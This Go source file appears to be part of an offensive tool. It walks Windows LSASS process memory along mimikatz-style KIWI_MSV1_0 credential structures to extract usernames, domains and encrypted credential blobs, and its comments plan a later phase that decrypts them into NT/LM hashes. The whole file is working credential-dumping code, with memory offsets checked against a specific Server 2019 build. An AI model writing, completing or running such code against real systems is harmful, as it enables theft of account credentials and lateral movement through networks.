package commands

// LSASS MSV1_0 Credential List walker — Phase 2C-ii-a.
//
// Phase 2C-i parses each LSAP_LOGON_SESSION_LIST node and extracts the
// `Credentials` field (PKIWI_MSV1_0_CREDENTIAL_LIST). That pointer is the
// head of a singly-linked list with one entry per AuthenticationPackage
// bound to the session (msv1_0, kerberos, wdigest, ...). Each entry's
// PrimaryCredentials_data field points to a KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC
// envelope containing UserName, Domain, and the encrypted credential blob.
//
// Phase 2C-ii-a (this file) walks both layers structurally and surfaces the
// encrypted blob bytes as opaque data. Phase 2C-ii-b will sigscan lsasrv.dll
// for the BCrypt key globals, BCryptDecrypt the blob, and parse the resulting
// plaintext into NT/LM hashes.
//
// All parsing runs against the cross-platform lsassReader interface and is
// fully testable on Linux against a synthetic page table.

import (
	"encoding/binary"
	"fmt"
)

// KIWI_MSV1_0_CREDENTIALS x64 layout — singly-linked list of per-AuthPackage
// credential entries. CredentialsPtr from the logon session points directly
// to the first entry (no LIST_ENTRY sentinel wrapper):
//
//	+0x00  next         (PKIWI_MSV1_0_CREDENTIALS, 8 bytes — NULL terminates)
//	+0x08  AuthPkgId    (DWORD, 4 bytes + 4 bytes alignment pad)
//	+0x10  PrimaryCreds (PKIWI_MSV1_0_PRIMARY_CREDENTIALS, 8 bytes)
//	total               (0x18 = 24 bytes)
//
// Verified on Server 2019 build 17763.3650: AuthPkgId=3 (WDigest) at +0x08,
// valid PrimaryCredentials pointer at +0x10. The singly-linked `next` at +0x00
// chains additional auth packages (MSV1_0, Kerberos, etc.).
const (
	credentialEntryReadSize   = 0x18
	credentialEntryNextOff    = 0
	credentialEntryAuthPkgOff = 0x08
	credentialEntryDataPtrOff = 0x10
)

// KIWI_MSV1_0_PRIMARY_CREDENTIALS layout — singly-linked chain of
// per-AuthPackage credential envelopes:
//
//	+0x00  next         (PKIWI_MSV1_0_PRIMARY_CREDENTIALS, 8 bytes)
//	+0x08  Primary      (ANSI_STRING, 16 bytes — auth package name, e.g. "Primary")
//	+0x18  Credentials  (LSA_UNICODE_STRING, 16 bytes — encrypted credential blob)
//	total               (0x28 = 40 bytes)
const (
	primaryCredentialEncSize = 0x28
	primaryEncNextOff        = 0
	primaryEncPrimaryOff     = 8
	primaryEncCredentialOff  = 0x18
)

// ciphertextSanityMax caps the encrypted-blob size at 4 KiB. msv1_0
// PRIMARY_CREDENTIAL plaintext is well under this; even the chunkier auth
// packages (LiveSSP, CloudAP) fit comfortably. The cap shields against
// runaway reads when Length is corrupted by layout drift.
const ciphertextSanityMax uint32 = 4096

// credentialListMaxEntries caps the per-session credential-list walk. Real
// sessions usually chain 1-4 AuthPackage entries; 64 is a defensive cap that
// will fire on a corrupted Flink rather than spinning indefinitely.
const credentialListMaxEntries = 64

// credentialListEntry is the structured projection of a single
// KIWI_MSV1_0_CREDENTIAL_LIST node walked from the credentials_ptr captured
// in Phase 2C-i.
type credentialListEntry struct {
	Address                   uintptr
	Flink                     uintptr
	AuthPackageId             uint32
	AuthPackageName           string
	PrimaryCredentialsDataPtr uintptr
	Primary                   *primaryCredentialEnc   // first entry in the primary credentials chain (backward compat)
	PrimaryEntries            []primaryCredentialEnc   // full chain of primary credential entries per auth package
	PrimaryReadErr            string                   // populated when the envelope read failed (vs. legitimate NULL)
	RawHex                    string                   // hex dump of entry bytes for layout diagnostics
}

// primaryCredentialEnc is the structured projection of
// KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC. The encrypted blob is captured raw —
// Phase 2C-ii-b will BCryptDecrypt it.
type primaryCredentialEnc struct {
	Address          uintptr
	UserName         string
	Domain           string
	EncryptedAddress uintptr
	EncryptedLength  uint16
	EncryptedBytes   []byte
	ParseErrors      []string
}

// walkCredentialList walks a singly-linked KIWI_MSV1_0_CREDENTIALS chain
// starting directly at `head`. The CredentialsPtr from the logon session
// points to the first entry (no sentinel). The `next` field at +0x00
// chains additional auth packages; NULL terminates.
//
// Termination:
//   - next == 0 (NULL-terminated — clean)
//   - cycle detected (defensive)
//   - maxEntries cap (defensive)
//   - read failure (returns partial + error)
//
// A zero head returns (nil, nil).
func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credentialListEntry, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if head == 0 {
		return nil, nil
	}
	if maxEntries <= 0 {
		maxEntries = credentialListMaxEntries
	}

	entries := make([]credentialListEntry, 0, 4)
	visited := make(map[uintptr]bool, 4)
	cursor := head
	for i := 0; i < maxEntries; i++ {
		if cursor == 0 {
			return entries, nil
		}
		if visited[cursor] {
			return entries, nil
		}
		visited[cursor] = true

		buf, err := r.Read(cursor, uint32(credentialEntryReadSize))
		if err != nil {
			return entries, fmt.Errorf("read credential entry %d at 0x%X: %w", i, cursor, err)
		}
		if len(buf) < credentialEntryReadSize {
			return entries, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need %d", i, cursor, len(buf), credentialEntryReadSize)
		}

		entry := credentialListEntry{
			Address:                   cursor,
			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialEntryNextOff : credentialEntryNextOff+8])),
			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialEntryAuthPkgOff : credentialEntryAuthPkgOff+4]),
			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialEntryDataPtrOff : credentialEntryDataPtrOff+8])),
		}
		entry.AuthPackageName = authPackageName(entry.AuthPackageId)
		entry.RawHex = fmt.Sprintf("%x", buf)

		if entry.PrimaryCredentialsDataPtr != 0 {
			primaries, perr := walkPrimaryCredentialChain(r, entry.PrimaryCredentialsDataPtr, 16)
			if perr != nil {
				entry.PrimaryReadErr = perr.Error()
			}
			if len(primaries) > 0 {
				entry.PrimaryEntries = primaries
				entry.Primary = &entry.PrimaryEntries[0]
			}
		}

		entries = append(entries, entry)
		cursor = entry.Flink
	}
	return entries, fmt.Errorf("credential list walk hit safety cap of %d entries (last cursor=0x%X)", maxEntries, cursor)
}

// readPrimaryCredentialEnc fetches a KIWI_MSV1_0_PRIMARY_CREDENTIALS envelope
// at `addr`. The Primary field (auth package name) is read as an ANSI string;
// the Credentials field is read as raw bytes for BCryptDecrypt by Phase 2C-ii-b.
//
// Per-field failures accumulate in ParseErrors rather than aborting fatally.
// The function returns an error only when the envelope header cannot be read.
func readPrimaryCredentialEnc(r lsassReader, addr uintptr) (primaryCredentialEnc, error) {
	if r == nil {
		return primaryCredentialEnc{}, fmt.Errorf("nil lsassReader")
	}
	if addr == 0 {
		return primaryCredentialEnc{}, fmt.Errorf("zero PrimaryCredentials_data address")
	}
	raw, err := r.Read(addr, uint32(primaryCredentialEncSize))
	if err != nil {
		return primaryCredentialEnc{}, fmt.Errorf("read PRIMARY_CREDENTIALS at 0x%X: %w", addr, err)
	}
	if len(raw) < primaryCredentialEncSize {
		return primaryCredentialEnc{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(raw), primaryCredentialEncSize)
	}

	p := primaryCredentialEnc{Address: addr}
	addErr := func(format string, args ...interface{}) {
		p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
	}

	// Primary (ANSI_STRING at +0x08): the auth package name (e.g. "Primary").
	if s, err := readAnsiString(r, raw, primaryEncPrimaryOff, 1024); err != nil {
		addErr("Primary: %v", err)
	} else {
		p.UserName = s
	}

	// Credentials (LSA_UNICODE_STRING at +0x18): encrypted credential blob.
	bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncCredentialOff, ciphertextSanityMax)
	p.EncryptedAddress = encAddr
	p.EncryptedLength = encLen
	if err != nil {
		addErr("Credentials: %v", err)
	} else {
		p.EncryptedBytes = bytes
	}
	return p, nil
}

// walkPrimaryCredentialChain walks the singly-linked
// KIWI_MSV1_0_PRIMARY_CREDENTIALS chain starting at `head`. Each entry has a
// `next` pointer at +0x00 that chains additional credential entries for the
// same auth package (e.g., "Primary" + "CredentialKeys" for MSV1_0, or
// "Kerberos" + "Kerberos-Newer-Keys" for Kerberos).
//
// NULL-terminated; cycle and cap detection are defensive measures.
func walkPrimaryCredentialChain(r lsassReader, head uintptr, maxEntries int) ([]primaryCredentialEnc, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if head == 0 {
		return nil, nil
	}
	if maxEntries <= 0 {
		maxEntries = 16
	}

	entries := make([]primaryCredentialEnc, 0, 2)
	visited := make(map[uintptr]bool, 4)
	cursor := head
	for i := 0; i < maxEntries; i++ {
		if cursor == 0 {
			return entries, nil
		}
		if visited[cursor] {
			return entries, nil
		}
		visited[cursor] = true

		raw, err := r.Read(cursor, uint32(primaryCredentialEncSize))
		if err != nil {
			return entries, fmt.Errorf("read PRIMARY_CREDENTIALS[%d] at 0x%X: %w", i, cursor, err)
		}
		if len(raw) < primaryCredentialEncSize {
			return entries, fmt.Errorf("short read at PRIMARY_CREDENTIALS[%d] (0x%X): got %d, want %d",
				i, cursor, len(raw), primaryCredentialEncSize)
		}

		p := primaryCredentialEnc{Address: cursor}
		addErr := func(format string, args ...interface{}) {
			p.ParseErrors = append(p.ParseErrors, fmt.Sprintf(format, args...))
		}

		nextPtr := uintptr(binary.LittleEndian.Uint64(raw[primaryEncNextOff : primaryEncNextOff+8]))

		if s, err := readAnsiString(r, raw, primaryEncPrimaryOff, 1024); err != nil {
			addErr("Primary: %v", err)
		} else {
			p.UserName = s
		}

		bytes, encAddr, encLen, err := readLSAUnicodeRawBytes(r, raw, primaryEncCredentialOff, ciphertextSanityMax)
		p.EncryptedAddress = encAddr
		p.EncryptedLength = encLen
		if err != nil {
			addErr("Credentials: %v", err)
		} else {
			p.EncryptedBytes = bytes
		}

		entries = append(entries, p)
		cursor = nextPtr
	}
	return entries, fmt.Errorf("primary credentials chain hit safety cap of %d", maxEntries)
}

// authPackageName labels well-known LSA AuthenticationPackage IDs. The mapping
// derives from the default registration order in HKLM\System\CurrentControlSet\
// Control\Lsa\Authentication Packages on a stock Windows 10/11 install. IDs
// can shift between builds and SKUs; unrecognized values are returned as
// "Unknown(N)" so the operator sees the raw id rather than a misleading label.
func authPackageName(id uint32) string {
	switch id {
	case 0:
		return "MSV1_0"
	case 1:
		return "Custom1"
	case 2:
		return "Kerberos"
	case 3:
		return "WDigest"
	case 4:
		return "TSPkg"
	case 5:
		return "PKU2U"
	case 6:
		return "CloudAP"
	default:
		return fmt.Sprintf("Unknown(%d)", id)
	}
}
